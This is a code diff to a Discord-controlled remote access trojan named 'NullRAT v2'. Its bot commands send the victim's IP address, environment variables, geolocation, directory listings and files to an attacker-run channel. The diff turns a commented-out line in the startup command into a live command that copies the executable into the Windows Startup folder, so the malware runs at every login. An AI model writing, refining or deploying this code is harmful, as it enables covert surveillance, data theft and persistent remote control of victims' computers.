@@ -57,21 +57,21 @@ def ft(p):
 @client.event
 async def on_ready():
     await client.get_channel(notification_channel).send(
-        "NullRAT v2 started on " + IP() + "\nCurrently present in " + ogdir
+        embed = discord.Embed(title = f"NullRAT v2 started on {IP()} \nCurrently present in {ogdir}")
     )
 
 @client.command()  # Sends IP
 async def getip(ctx):
     await ctx.send(
         embed=discord.Embed(
-            title="The IP of " + os.getenv("username") + " is: " + IP(), color=0x0081FA
+            title=f"The IP of {os.getenv('username')} is: {IP()}", color=0x0081FA
         )
     )
 
 @client.command()  # Get environment variables
 async def getenv(ctx, env):
     await ctx.send(
-        embed=EmbedGen("Environment Variable", "def", "The value is: ", os.getenv(env))
+        embed=discord.Embed(title = f"The environment variable is: \n{os.getenv(env)}", color = 0x0081FA)
     )
 
 @client.command()  # Gets current working directory
@@ -95,11 +95,10 @@ async def exit(ctx, ip):
 @client.command()
 async def geolocate(ctx):
     import urllib.request, json
-
     with urllib.request.urlopen("https://geolocation-db.com/json") as url:
         data = json.loads(url.read().decode())
     embed = discord.Embed(
-        title="Geolocation Information (Powered by geolocation-db)", color=0x0081FA
+        title="Geolocation Information \n(Powered by geolocation-db)", color=0x0081FA
     )
     embed.add_field(name="Country name", value=data["country_name"], inline=True)
     embed.add_field(name="City", value=data["city"], inline=True)
@@ -118,9 +117,7 @@ async def startup(ctx):
     await ctx.send(embed = discord.Embed(title = "Current Directory: \n" + os.getcwd(), color = 0x0081FA))
     os.chdir(ogdir)
     await ctx.send(embed = discord.Embed(title = "Trying to copy payload into startup directory...", color = 0x0081FA))
-    # subprocess.run('copy "' + executable + '" "' + os.getenv("appdata") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" + '"')
-    # subprocess.run(f'copy {executable} {os.getenv("appdata")}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-    print(f'copy {executable} {os.getenv("appdata")}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"')
+    subprocess.run(f'copy "{executable}" "{os.getenv("appdata")}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
     os.chdir(os.getenv("appdata") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
     await ctx.send(embed = discord.Embed(title = "If you see the program here, you're good to go: ", color = 0x0081FA))
     for value in os.listdir(): msg += f'{value}\n'
@@ -206,9 +203,7 @@ async def download(ctx, filepath):
 @client.command()
 async def cd(ctx, dire):
     dire = dire[:-1]
-    dire = dire[
-        1:
-    ]  # cd makes use of `` [code indicators]: Example - "`C:\Users\NullCode`"
+    dire = dire[1:]  # cd makes use of `` [code indicators]: Example - "`C:\Users\NullCode`"
     os.chdir(dire)
     await ctx.send(
         embed=EmbedGen(
@@ -223,8 +218,8 @@ async def dir(ctx, dire="null"):
         dire = os.getcwd()
         subprocess.run('dir > "%temp%\\dir.txt"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
     else:
-        # dir makes use of `` [code indicators]: Example - "`C:\Users\NullCode`"
-        dire = dire[:-1]; dire = dire[1:]
+        dire = dire[:-1]; dire = dire[1:] # dir makes use of `` [code indicators]: Example - "`C:\Users\NullCode`"
+
         os.chdir(dire)
         subprocess.run('dir > "%temp%\\dir.txt"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 
